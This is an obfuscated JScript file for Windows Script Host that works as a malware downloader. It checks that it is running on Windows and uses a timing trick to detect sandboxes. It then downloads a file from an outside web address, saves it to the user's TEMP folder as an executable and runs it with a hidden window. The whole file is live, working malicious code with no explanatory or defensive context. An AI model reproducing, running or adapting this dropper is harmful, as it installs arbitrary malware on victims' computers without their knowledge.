var _I = false;
var _W = "CreateObject";
var _I0 = function _CB() {return WScript[_W]("WScript"+".Shell");}(), _JU = 11;
var _X = "MSXML2.XMLHTTP";
var _UG = 2123213;
var _M = 0;
function _HK(_K){_I0["Run"](_K, _M, _M);};
function _B(){return _X + "";};
function _U(_MA, _WW){_M = _M * 1; return _MA - _WW;};
function _AA(){return _W;};
/*@cc_on
  @if (@_win32 || @_win64)
    _I = true;
  @end
@*/
if (_I)
{
var _RO = "";
function _HS(){return 22;};
var _UX = 0; var _L0 = 0;
function _IE()
{
var _L = new this["Date"]();
var _T = _L["getUTCMilliseconds"]();
WScript["Sleep"](_HS());
var _L = new this["Date"]();
var _LV = _L["getUTCMilliseconds"]();
WScript["Sleep"](_HS());
var _L = new this["Date"]();
var _B0 = _L["getUTCMilliseconds"]();
var _UX = "_H";
_UX = _U(_LV, _T);
var _L0 = "_IA";
_L0 = _U(_B0, _LV);
_RO = "open";
return _U(_UX, _L0);
}
var _V = false;
var _R0 = false;
for (var _RH = _M; _RH < _HS() * 1; _RH++){if (_IE() != _M){
_V = true; 
_L0 = "31" + 11 * _UX + _L0; 
_R0 = true; 
break;
}}
function _BD() {return ((_V == true) && (_V == _R0)) ? 1 : _M;};
if (_V && _BD() && _R0){
function _JV() {return _I0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "1Pfpkp4og4u.ex" + "e";};
 _F = _B();
 _P = WScript[_W](_F);
 var _EO = 1;
 while (_EO){
try {
	if (_EO == 1)
	{
		_P[_RO]("GET", "http://srijanexportstowelwarmers.co.uk/k9owpa", false);
		_P["send"]();
		_EE = "Sleep";
	}
	WScript[_EE](_HS() + 120); 
	if (_P["readystate"] < 2 * 2) continue;
	_EO = _M;
	function _N(_ZB) {var _XI = (1, 2, 3, 4, 5, _ZB); return _XI;};
	_SM = WScript[_AA()]("ADODB.Stream");
	_F = _SM;
	_F[_RO]();
	_F["type"] = _N(1);
	_F["write"](_P["ResponseBody"]);
	_SM["position"] = _N(_M);
	_F["Save" + "ToFile"](_JV(), 2);
	_SM["cl"+"ose"]();
	_R = _JV();
	_HK(_R);
} catch(_FI){};
}
}
}

